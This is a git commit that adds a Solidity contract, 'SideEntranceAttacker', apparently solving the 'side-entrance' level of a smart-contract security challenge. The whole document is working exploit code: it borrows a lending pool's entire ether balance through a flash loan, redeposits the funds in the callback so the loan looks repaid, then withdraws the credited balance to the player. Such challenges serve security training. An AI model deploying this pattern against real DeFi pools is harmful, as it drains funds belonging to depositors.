6e103dd6831ecd2dc9c42b1945916c03a8d2382f
mipiro <mikle97pir@yandex.ru>
2023-02-05 23:43:43 +0100

    solution: side-entrance

---
+++ contracts/side-entrance/SideEntranceAttacker.sol
@@ -0,0 +1,28 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import "./SideEntranceLenderPool.sol";
+
+contract SideEntranceAttacker is IFlashLoanEtherReceiver {
+
+    SideEntranceLenderPool public pool;
+    address public player;
+
+    constructor(address _pool) {
+        pool = SideEntranceLenderPool(_pool);
+        player = msg.sender;
+    }
+
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    function attack() external {
+        pool.flashLoan(address(pool).balance);
+        pool.withdraw();
+        payable(player).transfer(address(this).balance);
+    }
+
+    receive() external payable {}
+}
